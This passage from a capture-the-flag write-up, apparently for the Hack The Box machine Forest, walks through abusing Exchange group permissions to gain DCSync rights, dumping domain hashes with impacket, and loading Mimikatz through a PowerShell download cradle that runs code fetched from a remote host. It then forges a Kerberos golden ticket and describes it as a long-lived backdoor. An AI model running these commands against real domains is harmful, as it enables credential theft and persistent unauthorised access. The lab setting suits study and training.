    -   {{< figure src="/ox-hugo/2024-11-15-113636_.png" >}}
    -   I suspect this will be due to a scheduled task that will run and ensure that the only user in the group is "Exchange Trusted Subsystem". Luckily we have seen ourselves in the group so in theory all we have to do is re-add ourselves, grant ourselves DCSync privileges and then perform a DCSync attack in quick succession.

7.  We will run the below 2 commands, in quick succession to perform the final part of the attack:
    -   `net rpc group addmem "EXCHANGE WINDOWS PERMISSIONS" $user -U $domain/$user%$pass -S $box`
    -   `impacket-dacledit -action 'write' -rights 'DCSync' -principal $user -target-dn 'DC=HTB,DC=LOCAL' $domain/$user:$pass`
        -   {{< figure src="/ox-hugo/2024-11-14-141550_.png" >}}

8.  We can then quickly dump the NDST.dit database by using impacket-secrets dump:
    -   `impacket-secretsdump $domain/$user:$pass@$machine.$domain`
    -   {{< figure src="/ox-hugo/2024-11-14-141635_.png" >}}


## 4. Persistence: {#4-dot-persistence}


### Creating a Kerberos Golden Ticket: {#creating-a-kerberos-golden-ticket}

We already have the KRBTGT hash via secretsdump however I wanted to show an alternate option with using invoke-mimikatz in a download cradle for a targeted extraction of just the KRBTGT aes hash.

1.  Login as the user we have added:
    -   `evil-winrm -i $box -u $user -p $newPass`
    -   {{< figure src="/ox-hugo/2024-11-14-142738_.png" >}}
    -   We can login as our new user or with admin, as long as we have administrator rights.

2.  Load mimikatz into memory via download cradle:
    -   `iex(new-object net.webclient).downloadstring('http://10.10.14.99:9000/Invoke-Mimikatz.ps1')`
    -   {{< figure src="/ox-hugo/2024-11-14-151518_.png" >}}

3.  Perform a targeted DCSync attack to extract the KRBTGT hash.
    -   `Invoke-Mimikatz -Command '"privilege::debug" "lsadump::dcsync /user:krbtgt /domain:htb.local"'`
    -   {{< figure src="/ox-hugo/2024-11-14-151604_.png" >}}
    -   {{< figure src="/ox-hugo/2024-11-14-151714_.png" >}}
    -   It spits out errors but we still manage to get the hashes.

4.  Sync our host clock to the host using ntpdate:
    -   `sudo ntpdate -s $domain`

5.  Using `impacket-ticketer` to create the Golden Ticket:
    -   `impacket-ticketer -aesKey $krbtgt -domain-sid $sid -domain $domain Administrator`
    -   {{< figure src="/ox-hugo/2024-11-14-152242_.png" >}}

6.  Export the ticket to the `KRB5CCNAME` Variable:
    -   `export KRB5CCNAME=./Administrator.ccache`
    -   {{< figure src="/ox-hugo/2024-11-14-152307_.png" >}}

7.  Use the ticket for connecting via `psexec`
    -   `impacket-psexec -k -no-pass $machine.$domain`
    -   {{< figure src="/ox-hugo/2024-11-14-152332_.png" >}}


#### Why create a golden ticket? {#why-create-a-golden-ticket}

-   "But bloodstiller why are you making a golden ticket if you have the admin hash?" Glad you asked:
    -   Creating a Golden Ticket during an engagement is a reliable way to maintain access over the long haul. Here's why:
    -   `KRBTGT` **Hash Dependence**:
        -   Golden Tickets are generated using the `KRBTGT` account hash from the target's domain controller.
        -   Unlike user account passwords, `KRBTGT` hashes are rarely rotated (and in many organizations, they are never changed), so the Golden Ticket remains valid indefinitely.
    -   `KRBTGT` **Hash—The Key to It All (for upto 10 years)**:
        -   A Golden Ticket can allow you to maintain access to a system for up to 10 years (yeah, you read that right the default lifespan of a golden ticket is 10 years) without needing additional credentials.
        -   This makes it a reliable backdoor, especially if re-access is needed long after initial entry.
        -   **Think about it**: even if they reset every user's password (including the administrator etc) your Golden Ticket is still valid because it's tied to the `KRBTGT` account, not individual users.


## Lessons Learned: {#lessons-learned}


### What did I learn? {#what-did-i-learn}

1.  I learned that even though I got a random bypass for a secondary route to root that I cannot recreate it no matter how hard I try (1 full day)
2.  I decided to actually put all of my ASREP-Roasting knowledge in an article so that hopefully cemeneted that further:
    -   <https://bloodstiller.com/articles/understandingasreproasting/>


### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}

1.  Had some real slow moments when I had multiple evil-winrm sessions open and was wondering why mimikatz would not work, because I was running it from a user without DCSync privs&#x2026;..


## Sign off: {#sign-off}

Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!

Until next time, hack the planet!

&#x2013; Bloodstiller

&#x2013; Get in touch bloodstiller at proton dot me


